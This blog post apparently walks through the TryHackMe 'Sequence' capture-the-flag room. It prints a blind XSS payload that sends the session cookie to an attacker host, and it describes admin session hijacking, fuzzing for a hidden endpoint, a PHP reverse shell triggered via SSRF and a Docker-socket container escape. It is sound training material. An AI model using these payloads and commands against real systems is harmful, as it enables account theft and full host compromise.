---
layout: post
title: TryHackMe - "Sequence"
categories: Challenges
tags: pen-testing 
---
[Link to the challenge](https://tryhackme.com/room/sequence)

## Intro

The target machine has several vulnerabilities that must be exploited to advance toward capturing the root flag. It takes several attempts, discovering that among the multitude of possibilities, we often ignore the simplest ones.

## XSS

Let's start with the "review.thm" web application, which has a login screen and a public contact form. After some manual testing, we discover that the form is vulnerable to blind XSS.
Simply start an HTTP server on our attack machine, and post a feedback to the website's contact form with the following message containing the XSS payload:

Attacker machine

`python -m http.server 8082`

Website review.thm (contact form)

        <script>var myCookie = document.cookie.match('(^|;) *PHPSESSID=([^;]*)')[2]; 
        fetch('http://<attacker-machine>:8082?query=' + myCookie);</script>

The message we post will be read by the moderator, and since this endpoint is vulnerable to XSS attack (due to the fact that it does not sanitize html special characters), the moderator's browser will execute our malicious javascript code which will extract its session cookie from the browser's memory and send it to us, as an http query to our attacker machine. 
Note: the JavaScript code can read the browser cookie because it has been set by the server as "html-only=false".

We write down the session number, and insert this number in place of the session number currently present in our browser (use the browser inspector, and go to the storage section, then cookies, review.thm, phpsessionid).
Then, we reload the page, or go to the site index. There you have it, we've stolen the moderator's session: we're logged in as mod user.

Now we can use the chat (chat.php)

## CSRF

Even the chat itself, at first glance, appears vulnerable to cross-site scripting (XSS), as there's a JavaScript block on the client side that checks for suspicious HTML tags, which might lead us to believe we can bypass these simple checks. In the end, we discover that the chat is secure against XSS attacks (the server side sanitizes HTML delimiters, so any XSS payload is handled correctly).

But why did we waste all this time? All we need to do is post a link in the chat. What link do we use? We use the link corresponding to the "feedback viewer" page (http://review.thm/admin_view.php). When the administrator, both in the chat and online, will click on this link, he will simply open the feedback listing page, where our previously malicious feedback posted via the contact form will still be present, and therefore the administrator's browser will also execute our malicious code, stealing his session. Note: on our attacker machine, remember to keep our web listener active, so as to receive both the moderator's session code and the administrator's session code.

We'll enter the administrator session number in our browser, as we did before (with the moderator session code), and we'll be logged in as Admin user. At this point, an interesting additional section will appear in the home page: the lottery section. Clicking "lottery" opens a simple maintenance page.
Let's see how the HTTP request for the lottery is made (to analyze HTTP requests and responses, we can use `burpsuite` or `zaproxy`). It's a POST (multipart-form data) to dashboard.php endpoint, with the request body stating that the feature to be loaded is the lottery.php file. 
Let's show a synthetic example of this http request:

        POST http://review.thm/dashboard.php HTTP/1.1
        Host: review.thm
        Content-Type: multipart/form-data; boundary=----geckoformboundary51386d6f30ee3157e08df87b362d1936
        Content-Length: 179
        Origin: http://review.thm
        Referer: http://review.thm/dashboard.php
        Cookie: PHPSESSID=78dpsnpgtmhgaeje3cv7lhabog

        ------geckoformboundary51386d6f30ee3157e08df87b362d1936
        Content-Disposition: form-data; name="feature"

        lottery.php
        ------geckoformboundary51386d6f30ee3157e08df87b362d1936--

Now the question is: are there other hidden endpoints besides lottery?
We can try fuzzing the "feature" field. We basically send multiple HTTP requests, each of which replaces "lottery.php" with a string xxxxxxx.php taken from a dictionary.
To automate this process, we can use a fuzz tool built into zaproxy or burpsuite. As a dictionary, we use the following text file available on Kali Linux: "/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt"

Well, filtering the size of received responses, we notice that a special endpoint, "finance.php," exists as a dashboard feature.
This endpoint returns a password-protected section, protected only client-side, so we can easily bypass this protection by using the browser inspector to modify the received page, simply by setting the finance table's HTML attribute to "display: block" (instead of "display: hidden").

Alternatively, by enumerating the hidden directories of the review.thm website, we notice a web directory called "mail", containing a "dump.txt" file. This file explains that the "lottery.php" and "finance.php" endpoints are not located on the review.thm host, but on the internal network. 
We are also given the password for the "finance" section.

The "finance" section allows us to upload any file. Well, we can upload a PHP reverse shell.

## SSRF

We uploaded our reverse shell, but where did it go on the server? The challenge website has an "uploads" directory, but it's empty. It seems strange.
So, where's our newly uploaded file?
The answer is: "Do you remember where lottery.php and finance.php sections are located?". As mentioned earlier, they are located somewhere in the <u>internal network</u>, not in the host hosting the site, and this also applies to the actual "uploads" directory where our malicious php file ended up.

So, the same technique we used to find the "finance.php" endpoint can be used to get the uploaded file. Simply use the burpsuite (or zaproxy) request interceptor to take the request from the "lottery.php" endpoint (i.e., the multipart post to the dashboard, with the "lottery.php" feature), and replace the "lottery.php" string with "uploads/reverse-shell.php". At this point, <u>the internal network web server</u> will execute the PHP code contained in this uploaded file, and we'll obtain the desired reverse shell.
Note: remember to start the reverse shell listener on our attacker machine (`nc -lvnp 4446`).

Well, our shell is a root shell. Currently we are in the "internal network" host, not in the main website host, so root flag.txt is not here: it's placed inside the main host.
 
...and really we are inside a docker container!!! 
In other words, the internal network host (which contains "lottery", "finance", and the true "uploads" directory) <u>is a container</u>: we must find a way to escape from this container and read the filesystem of the main host. 

## Escape the container

Inside the container, using the shell, we use the Linpeas tool to see if there are any vulnerabilities that can be exploited to escape the container.
Linpeas shows us several theoretically viable options, such as inserting a module into the kernel, but the container we're in is very minimal and doesn't offer many tools for high-level hacking.

The best way is the simplest: the presence of the Unix socket /var/run/docker.sock, which is a special file (socket) through which the Docker client communicates with the Docker server (engine), which runs in the "real" machine.

In short, in the container we have the `docker` command (docker client), and we also have the /var/run/docker.sock file, used by the client to communicate with the Docker engine (docker server, running outside, in the real machine).

We can then send standard Docker commands to the Docker server (via the socket), including listing the Docker images and creating a new Docker image.
The trick is that in the new docker image we create, we <u>additionally</u> mount the entire filesystem of the real machine, and jump into it.

Here's what we do:

`docker images`

        REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
        phpvulnerable   latest    d0bf58293d3b   5 months ago   926MB
        php             8.1-cli   0ead645a9bc2   8 months ago   527MB

`docker run --rm -it -v /:/mnt phpvulnerable chroot /mnt sh`

We're now inside the new "evil" container, inside /mnt, where we can navigate into the entire target machine file system. We can read /root/flag.txt

NOTE: before running the last command you need to stabilize the shell, in order to get a virtual terminal.

## Conclusions

This challenge is very good. The hacking techniques required aren't complicated, but there's a risk of being sidetracked by complicated paths that don't lead to the desired results.
So, ultimately, it's more than fair that the difficulty is set as medium, certainly it's not easy, and completing this challenge is quite satisfying.
